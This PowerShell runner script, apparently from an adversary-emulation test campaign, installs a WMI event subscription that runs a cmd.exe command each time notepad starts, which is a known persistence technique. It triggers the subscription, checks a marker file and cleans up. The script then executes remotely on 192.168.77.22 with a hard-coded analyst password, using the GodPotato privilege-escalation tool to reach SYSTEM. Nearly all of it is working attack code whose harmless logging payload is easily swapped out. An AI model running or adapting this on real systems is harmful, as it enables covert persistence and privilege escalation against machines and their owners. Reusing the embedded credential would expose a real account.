# 3.5J corrected runner: explicit reference strings for __FilterToConsumerBinding
$ErrorActionPreference = 'Continue'

$script = @'
$ErrorActionPreference = 'Continue'

# Thorough cleanup
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35JFilter' } | ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JFilter' } | ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JConsumer' } | ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
Start-Sleep -Seconds 2

# 1. EventFilter
$filterArgs = @{
    EventNamespace = 'root\cimv2'
    Name = 'CADRE35JFilter'
    Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA "Win32_Process" AND TargetInstance.Name = "notepad.exe"'
    QueryLanguage = 'WQL'
}
$null = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
Write-Output 'FILTER_CREATED'

# 2. CommandLineEventConsumer
$consumerArgs = @{
    Name = 'CADRE35JConsumer'
    CommandLineTemplate = 'cmd.exe /c echo %COMPUTERNAME% %TIME% %USERNAME% >> C:\Windows\Temp\cadre-wmi-events.txt'
    ExecutablePath = 'C:\Windows\System32\cmd.exe'
}
$null = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
Write-Output 'CONSUMER_CREATED'

# 3. Binding — explicit reference strings (ManagementObject pass fails with "Object or property already exists")
$bindingArgs = @{
    Filter   = '__EventFilter.Name="CADRE35JFilter"'
    Consumer = 'CommandLineEventConsumer.Name="CADRE35JConsumer"'
}
$null = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
Write-Output 'BINDING_CREATED'

# Confirm binding exists
$bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35JFilter' }
Write-Output "BINDINGS_CONFIRMED $($bindings.Count)"

# 4. Trigger + verify
Remove-Item 'C:\Windows\Temp\cadre-wmi-events.txt' -ErrorAction SilentlyContinue
Start-Process -FilePath 'C:\Windows\System32\notepad.exe' -ErrorAction SilentlyContinue
Start-Sleep -Seconds 12
Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
$markerHit = Test-Path 'C:\Windows\Temp\cadre-wmi-events.txt'
Write-Output "WMI_MARKER_HIT $markerHit"
if ($markerHit) { Get-Content 'C:\Windows\Temp\cadre-wmi-events.txt' -Tail 3 | ForEach-Object { Write-Output "WMI_EVENT_LOG|$_" } }

# 5. Cleanup
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
    Where-Object { $_.Filter -match 'CADRE35JFilter' } | ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JFilter' } | ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -eq 'CADRE35JConsumer' } | ForEach-Object { Remove-WmiObject $_ -ErrorAction SilentlyContinue }
Write-Output 'WMI_CLEANUP_DONE'

$left = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq 'CADRE35JFilter' }
Write-Output "WMI_FILTER_LEFT $($null -ne $left)"
'@

& 'C:\Tools\ADTools\campaign-a-t043-system-exec.ps1' -Server 192.168.77.22 -Username analyst_t1 -Password 'T13r_An@lyst!' -GpPath 'C:\Windows\Temp\cadre-tools\GodPotato.exe' -ScriptBlock $script
Write-Output 'T035J_RUN2_DONE'
